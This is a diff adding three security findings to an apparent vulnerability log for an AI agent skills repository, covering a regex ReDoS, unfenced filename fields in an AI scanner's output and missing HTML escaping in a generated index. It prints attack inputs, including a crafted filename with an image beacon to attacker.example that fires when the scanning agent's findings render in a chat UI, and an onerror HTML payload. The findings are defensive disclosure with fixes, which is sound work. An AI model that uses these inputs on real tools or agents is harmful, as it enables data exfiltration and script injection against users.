@@ -2881,6 +2881,63 @@ location: plugins/ievo/agents/deep-reviewer.md:180,204-242 (Step 3 report templa
 
 ---
 
+## S-2026-08-17-001 — scrub.mjs's NAME_ALT snake-case alternative retains the unbounded quantifier the maintainers' own comment says they deliberately left open when bounding the kebab-case sibling (ReDoS)
+
+```yaml
+id: S-2026-08-17-001
+discovered_at: 2026-08-17T07:00:00Z
+run_id: 32004063646
+target_repo: ievo-ai/skills
+title: scrub.mjs's NAME_ALT snake-case alternative (line 262) is still an unbounded [A-Za-z0-9_]* quantifier, the same ReDoS shape the kebab-case sibling on line 263 was bounded to {0,254} to fix in skills#620 — the file's own comment says the snake form was left untouched "out of scope"
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/637
+cwe: CWE-1333
+confidence: high
+location: plugins/ievo/scripts/scrub.mjs:262 (NAME_ALT, consumed by ASSIGNMENT_RE / redactNamedSecrets)
+```
+
+`redactNamedSecrets` runs `text.replace(ASSIGNMENT_RE, ...)`, gated by a leading boundary `(?<![A-Za-z0-9])` (not `\b`, per skills#612) that permits a fresh match attempt right after every underscore, not just at the start of a contiguous run. `NAME_ALT`'s snake-case alternative (`[A-Za-z0-9][A-Za-z0-9_]*_(?:SUFFIX)`, line 262) has an unbounded middle run — unlike its kebab-case sibling two lines below (`[A-Za-z0-9][A-Za-z0-9-]{0,254}-(?:SUFFIX)`), which skills#620 bounded specifically to fix this exact quadratic-backtracking class (the file's own comment: "measured on the unbounded form: 989ms at 40 KB, 3.9s at 80 KB (quadrupling per doubling)... The pre-existing snake alternative shares this same unbounded shape and is not touched here — out of scope for skills#620, which only adds this new kebab alternative"). An input like `"a_".repeat(20000) + "x"` (long underscore-delimited filler, no terminal TOKEN/KEY/SECRET/PASSWORD/ID suffix) creates ~20,000 restart positions, each triggering greedy-then-backtrack O(n) work — O(n²) total. Reachable via `evolution_candidates.mjs --text-file` (capped 256 KiB — still tens of seconds extrapolated from the measured growth rate) or `scrub.mjs`'s own CLI stdin path, which this file does not size-cap at all. Independently re-verified 2026-08-17 by direct read of current `main`: line 262 unchanged, still unbounded; line 263 (kebab) confirmed bounded at `{0,254}`. Recommendation: bound line 262 identically — `[A-Za-z0-9][A-Za-z0-9_]{0,254}_` — and add a linearity regression test mirroring the existing kebab/PEM/quoted-value ones; also worth checking the camelCase alternative (line 264) against an underscore-interspersed adversarial input, since it shares the same restart-after-underscore boundary.
+
+---
+
+## S-2026-08-17-002 — vuln-scanner.md / vuln-scan.md's own excerpt-containment rule doesn't cover the `file`/`function` finding fields, only title/exploit_chain/recommendation
+
+```yaml
+id: S-2026-08-17-002
+discovered_at: 2026-08-17T07:00:00Z
+run_id: 32004063646
+target_repo: ievo-ai/skills
+title: agents/vuln-scanner.md's "Excerpt containment" note (and commands/vuln-scan.md's matching display note) name only title/exploit_chain.*/recommendation as fenced fields — file and function are emitted raw despite both being drawn from scanned, potentially attacker-controlled tree entries
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/638
+cwe: CWE-79
+confidence: medium
+location: plugins/ievo/agents/vuln-scanner.md (Step 2 JSON schema + "Excerpt containment" note); plugins/ievo/commands/vuln-scan.md (Phase 4 "Present results" + its own "Excerpt containment — display verbatim, don't unwrap" note)
+```
+
+`vuln-scanner.md`'s Step 2 schema requires every finding to cite `file` (relative path) and `function` alongside the fields its own "Excerpt containment" note fences (`title`, `exploit_chain.entry/flow/impact`, `recommendation`) — the note's own text scopes the fencing rule to exactly those four, never naming `file`/`function`. `commands/vuln-scan.md` Phase 4 then prints `file path with line number` directly, and its mirrored "display verbatim, don't unwrap" note likewise only names the same four fields as already-fenced-by-the-agent. `vuln-scan` is explicitly designed to run over untrusted trees (`--module`/`--full` against a vendored third-party skill/plugin, a malicious PR branch, any not-fully-trusted checkout) where a git tree entry name can contain almost any byte. A crafted filename such as `` ![x](https://attacker.example/beacon.png?d=1).py `` containing an easily-detectable issue (a hardcoded secret stub, guaranteeing the scanning agent cites it in a finding's `file` value) fires a live image-beacon or renders a spoofed link the moment the findings list displays in the Claude Code chat UI — no further action needed. Independently re-verified 2026-08-17 by direct read of current `main`: `agents/vuln-scanner.md`'s containment note and `commands/vuln-scan.md`'s matching note both confirmed to name only the four fields, `file`/`function` absent from both. Recommendation: extend both notes to cover `file`/`function` with the same backtick-run-sizing/dual-padding/CR-LF-collapse mechanics already specified for the other four fields.
+
+---
+
+## S-2026-08-17-003 — scan_repo.mjs's escapeMdCell neutralizes Markdown table/link/image syntax but never escapes raw HTML angle brackets
+
+```yaml
+id: S-2026-08-17-003
+discovered_at: 2026-08-17T07:00:00Z
+run_id: 32004063646
+target_repo: ievo-ai/skills
+title: escapeMdCell (scan_repo.mjs) escapes backslash/pipe/backtick/[/! but never < or >, so attacker-controlled repo frontmatter/manifest text can inject raw HTML into the published community-index Markdown
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/639
+cwe: CWE-116
+confidence: medium
+location: plugins/ievo/scripts/scan_repo.mjs:353-364 (escapeMdCell)
+```
+
+`renderIndexMd` interpolates every attacker-controlled frontmatter/manifest field (a SKILL.md `description:`, an agent `name:`, a plugin's `license:`/`author:`, an MCP `endpoint:`) through `escapeMdCell()` before writing the generated community-index `.md`. The function strips control/Bidi/zero-width characters, collapses whitespace, then escapes exactly `\`, `|`, backtick (to `'`), `[`, and `!` — per its own comment, the set needed to stop table-breaking, code-span, and link/image Markdown syntax. It never touches `<`/`>`, so a raw HTML fragment (e.g. `<img src=x onerror=...>`) in a scanned repo's frontmatter passes through into the generated index file unmodified. CommonMark/GFM permit raw inline HTML by default absent a renderer's own sanitization; GitHub.com's own web renderer already sanitizes dangerous tags, limiting impact there, but the index artifact is designed for broader downstream consumption (this same plugin's own vuln-scan skill treats verbatim excerpts as a live-rendering risk beyond just GitHub's renderer). A downstream consumer (a static docs site, an IDE/editor preview, an LLM-driven UI) that renders these `.md` files without its own HTML sanitization would render the attacker's tag live. Independently re-verified 2026-08-17 by direct read of current `main`: `escapeMdCell`'s five `.replace()` calls confirmed to cover only `\`/`|`/backtick/`[`/`!`, no `<`/`>` handling anywhere in the function or its call sites. Distinct from the already-fixed S-2026-07-14-001 (Markdown link/image syntax, not raw HTML). Recommendation: add `.replace(/</g, "&lt;").replace(/>/g, "&gt;")` (or equivalent) to `escapeMdCell` alongside the existing escapes.
+
+---
+
 ## F-2026-08-15-001 — scan_repo.mjs / discover.mjs / index-repos are hardcoded to github.com, can't discover or audit GitLab-hosted skill/plugin repos
 
 ```yaml
